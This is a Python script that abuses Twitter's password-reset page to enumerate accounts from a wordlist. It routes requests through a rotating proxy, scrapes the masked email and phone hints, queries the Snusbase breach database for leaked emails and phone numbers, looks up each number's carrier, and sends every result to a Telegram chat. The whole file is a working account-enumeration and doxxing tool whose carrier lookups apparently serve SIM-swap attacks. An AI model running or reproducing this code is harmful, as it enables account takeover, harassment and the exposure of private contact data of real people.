import os
import re
import telepot
import requests
from decouple import config
import ast

TOKENn = config('TELEGRAMTOKEN')
CHAT_IDd = config('TELEGRAMCHATID')
access_key = config('CARRIER_API_KEY')

# Function to fetch emails from wordlist.txt
def fetch_emails(filename):
    print("[ACTION] Fetching Wordlist...")
    with open(filename, "r") as file:
        emails = [line.strip() for line in file if line.strip()]
        print("[INFO] Wordlist Fetched!")
    return emails

def validate_and_lookup(number):
    access_key = config('CARRIER_API_KEY')
    url = f'http://apilayer.net/api/validate?access_key={access_key}&number={number}&country_code=US&format=1'
    
    try:
        response = requests.get(url)
        data = response.json()
        
        if data.get('valid'):
            return {
                'number': data.get('international_format'),
                'carrier': data.get('carrier') or 'No Carrier Found'  # Return 'No Carrier Found' if carrier is empty
            }
        else:
            return None
    except Exception as e:
        print(f"Error processing number {number}: {str(e)}")
        return None

# Function to extract authenticity token from source
def extract_auth_token(source):
    print("[ACTION] Extracting AUTH Token...")
    left_delim = '<input type="hidden" name="authenticity_token" value="'
    right_delim = '">'
    match = re.search(f"{left_delim}(.*?){right_delim}", source)
    if match:
        return match.group(1)
    return None

# Function to make the POST request and extract email and phone
def make_post_request(target_url, proxy_url, email, headers, cookies):
    proxies = {"http": proxy_url, "https": proxy_url}
    post_data = {"authenticity_token": "", "account_identifier": email}

    response = requests.get(target_url, proxies=proxies, headers=headers, cookies=cookies)
    if response.status_code == 200:
        auth_token = extract_auth_token(response.text)
        if auth_token:
            post_data["authenticity_token"] = auth_token
            print(f"[INFO] AUTH Token Fetched: {auth_token}")
            post_response = requests.post(target_url, data=post_data, proxies=proxies, headers=headers, cookies=cookies)

            if "How do you want to reset your password?" in post_response.text:
                email_left_delim = 'Send an email to <strong dir="ltr">'
                email_right_delim = '</'
                phone_left_delim = 'Text a code to the phone number ending in <strong dir="ltr">'
                phone_right_delim = '</'

                email_match = re.search(f"{email_left_delim}(.*?){email_right_delim}", post_response.text)
                phone_match = re.search(f"{phone_left_delim}(.*?){phone_right_delim}", post_response.text)

                if email_match and phone_match:
                    faemail = email_match.group(1).strip()
                    faphone = phone_match.group(1).strip()

                    with open("./database/hits.txt", "a", encoding="utf-8") as hits_file:
                        hits_file.write(f"🦀 Identifier: {email}\n")
                        hits_file.write(f"🦀 Mail Hint: {faemail}\n")
                        hits_file.write(f"🦀 Mobile Hint: {faphone}\n")
                        hits_file.write(f"━━━━━━━━━━━━━━━━\n")

                    bot.sendMessage(chat_id, f"🦀 Identifier: `{email}`\n🦀 Mail Hint: `{faemail}`\n🦀 Mobile Hint: `{faphone}`", parse_mode='Markdown')
                    print(f"[INFO] Identifier: {email}")
                    print(f"[INFO] Mail Hint: {faemail}")
                    print(f"[INFO] Mobile Hint: {faphone}")
                    print("[INFO] Variables extracted and saved to DB.")
                    print("[ACTION] Checking Snusbase...")
                    snusbase(email)
                elif email_match:
                    faemail = email_match.group(1).strip()

                    with open("./database/hits.txt", "a", encoding="utf-8") as hits_file:
                        hits_file.write(f"🦀 Identifier: {email}\n")
                        hits_file.write(f"🦀 Mail Hint: {faemail}\n")
                        hits_file.write(f"🦈 No Mobile Connected\n")
                        hits_file.write(f"━━━━━━━━━━━━━━━━\n")

                    bot.sendMessage(chat_id, f"🦀 Identifier: `{email}`\n🦀 Mail Hint: `{faemail}`\n🦈 No Mobile Connected", parse_mode='Markdown')
                    print(f"[INFO] Identifier: {email}")
                    print(f"[INFO] Mail Hint: {faemail}")
                    print(f"[WARNING] No Mobile Connected.")

                    print("[INFO] Variables extracted and saved to DB.")

            elif "Verify your personal information" in post_response.text:
                bot.sendMessage(chat_id, "🦈 Further verification needed.")
                print("[WARNING] Further verification needed.")

            elif "Please try again later." in post_response.text:
                bot.sendMessage(chat_id, "🦈 Ratelimited / Name banned.")
                print("[WARNING] Ratelimited / Name banned.")

            elif "We couldn't find your account with that information" in post_response.text:
                bot.sendMessage(chat_id, "🦈 No account exists with that Identifier.")
                print("[WARNING] No account exists with that Identifier.")
            else:
                bot.sendMessage(chat_id, "🦈 Error.")
                print("[ERROR] Error.")

    return True

def send_hits_to_telegram(hits_file_path, bot_token, chat_id):
    with open(hits_file_path, "r", encoding="utf-8") as hits_file:
        hits_content = hits_file.read()

    telegram_api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": hits_content,
        "parse_mode": "HTML",  # This will preserve the formatting, including emojis
    }

    response = requests.post(telegram_api_url, json=payload)
    if response.ok:
        print("[INFO] Hits Posted.")
    else:
        print("[INFO] Zero Hits.")
        bot.sendMessage(chat_id, "[INFO] Zero Hits")

    # Clear the hits.txt file for the next runtime
    with open(hits_file_path, "w", encoding="utf-8"):
        pass

def snusbase(email): 
    chat_id = config('TELEGRAMCHATID')
    print(f"[ACTION] Searching for Email for Username: {email}")
    bot.sendMessage(chat_id, f"🦀 Checking Twitter DB: `{email}`...", parse_mode= 'Markdown')

    # Make a Snusbase API request to search for the username
    authapi = config('SNUSBASEAPIKEY')
    snusbase_search_url = "https://api-experimental.snusbase.com/data/search"
    snusbase_search_data = {
        "terms": [email],
        "types": ["username"],  # Search by username
        "wildcard": False
    }
    snusbase_search_headers = {
        "Auth": authapi,  # Replace with your activation code
        "Content-Type": "application/json"
    }

    response = requests.post(snusbase_search_url, json=snusbase_search_data, headers=snusbase_search_headers)

    if response.status_code == 200:
        result = response.json()

        # Check if the word "TWITTER" is found in the response
        if "TWITTER" in str(result):
            print(f"[INFO] Username {email} has been breached.")

            # Extract the relevant email(s) from the response
            relevant_emails = []
            for database_name, entries in result["results"].items():
                if "TWITTER" in database_name:
                    for entry in entries:
                        if "email" in entry:
                            Semail = entry["email"]
                            if Semail not in relevant_emails:
                                relevant_emails.append(Semail)
                    
            if relevant_emails:
                print(f"[INFO] Found Relevant Email(s) for Username {email}: {relevant_emails}")
                bot.sendMessage(chat_id, f"🦀 Emails Found: `{relevant_emails}`", parse_mode= 'Markdown')
                # You can process the found email(s) here
                # For example, you can append them to a list or save them to a file
                # Now, search for phone numbers using the found emails
                phone_numbers = []
                for Semail in relevant_emails:
                    phone_numbers.extend(search_for_phone_numbers(Semail))
                if phone_numbers:
                    formatted_phone_numbers = "\n".join(phone_numbers)
                    print(f"[INFO] Found Phone Numbers for Email(s): {formatted_phone_numbers}")
                    bot.sendMessage(chat_id, f"🦀 Numbers Found: `{formatted_phone_numbers}`", parse_mode= 'Markdown')
                    # You can process the found phone numbers here
                    # For example, you can append them to a list or save them to a file
                else:
                    print(f"[INFO] No Phone Numbers Found for Email(s).")
                    bot.sendMessage(chat_id, f"🦈 No Phone Numbers Found for Email(s)", parse_mode= 'Markdown')
            else:
                print("[INFO] No Relevant Emails Found for Username.")
                bot.sendMessage(chat_id, f"🦈 No Relevant Emails Found for Username.", parse_mode= 'Markdown')
        else:
            print("[INFO] Username not found in any breaches.")
            bot.sendMessage(chat_id, f"🦈 Username not found in any breaches.", parse_mode= 'Markdown')
    else:
        print(f"[ERROR] Error occurred while searching for the username {email} in Snusbase.")
        bot.sendMessage(chat_id, f"🦈 Error.", parse_mode= 'Markdown')

def search_for_phone_numbers(Semail):
    print(f"[ACTION] Searching for Phone Numbers using Email: {Semail}")

    # Make a Snusbase API request to search for phone numbers using the email
    authapi = config('SNUSBASEAPIKEY')
    snusbase_search_url = "https://api-experimental.snusbase.com/data/search"
    snusbase_search_data = {
        "terms": [Semail],
        "types": ["email"],  # Search by email
        "wildcard": False
    }
    snusbase_search_headers = {
        "Auth": authapi,  # Replace with your activation code
        "Content-Type": "application/json"
    }

    response = requests.post(snusbase_search_url, json=snusbase_search_data, headers=snusbase_search_headers)

    if response.status_code == 200:
        result = response.json()

        # Extract the phone numbers from the response
        phone_numbers = []
        for database_name, entries in result["results"].items():
            for entry in entries:
                if "phone" in entry:
                    phone_number = entry["phone"]
                    if 'X' not in phone_number:
                        # Remove the "+1" prefix if it exists
                        if phone_number.startswith("+1"):
                            phone_number = phone_number[2:]

                        # Validate and lookup carrier for the phone number
                        result = validate_and_lookup(phone_number)
                        if result:
                            number = result["number"]
                            carrier = result["carrier"]
                            formatted_phone = f"{number} | {carrier}" if carrier else number
                            phone_numbers.append(formatted_phone)
        
        return phone_numbers
    else:
        print(f"[ERROR] Error occurred while searching for phone numbers using Email {Semail}.")
        return []

if __name__ == "__main__":
    proxy_url = config('ROTATINGPROXY')
    target_url = "https://twitter.com/account/begin_password_reset"  # Replace this with the URL you want to fetch

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    # Fetch emails from wordlist.txt
    email_list = fetch_emails("./database/wordlist.txt")

    # Check if there are any emails in the list
    if not email_list:
        print("[WARNING] No emails found in DB. Exiting.")
        exit()

    bot_token = config('TELEGRAMTOKEN')
    chat_id = config('TELEGRAMCHATID')

    while email_list:
        bot = telepot.Bot(bot_token)
        email = email_list.pop(0)
        print(f"[ACTION] Using Identifier: {email}")
        bot.sendMessage(chat_id, f"🦀 Checking `{email}`...", parse_mode= 'Markdown')

        # Initial GET request to fetch cookies
        response = requests.get(target_url, proxies={"http": proxy_url, "https": proxy_url}, headers=headers)
        if response.status_code == 200:
            cookies = response.cookies
        else:
            print(f"[ERROR] Failed to fetch cookies. Status code: {response.status_code}")
            continue

        success = make_post_request(target_url, proxy_url, email, headers, cookies)

        if success:
            print(f"[ACTION] Identifier checked: {email}")

    print("[INFO] All Identifiers checked.")


    # Send the hits.txt content to Telegram and clear the file for the next runtime
    # bot.sendDocument(chat_id, open("hits.txt", "rb"), caption="🦀 github.com/prostate")